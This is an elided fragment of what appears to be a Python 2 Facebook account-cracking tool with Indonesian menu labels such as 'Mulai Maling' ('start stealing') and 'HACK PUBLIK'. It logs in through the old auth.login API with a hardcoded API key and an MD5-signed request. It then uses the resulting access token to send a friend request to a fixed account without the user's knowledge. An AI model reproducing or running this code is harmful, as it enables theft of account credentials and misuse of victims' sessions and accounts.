...
def login():
	...
	try:
		...
		if 'save-device' in url:
			try:
				...
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"2.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				...
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['login'])
				menu()
	...
	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
	print "\033[1;32;40m[1] \033[1;33;40m══Mulai Maling"																														
...
def keren():
	...
	os.system('clear')
	print logo
	print "\x1b[1;32;40m[1] \033[1;33;40m══HACK PUBLIK"
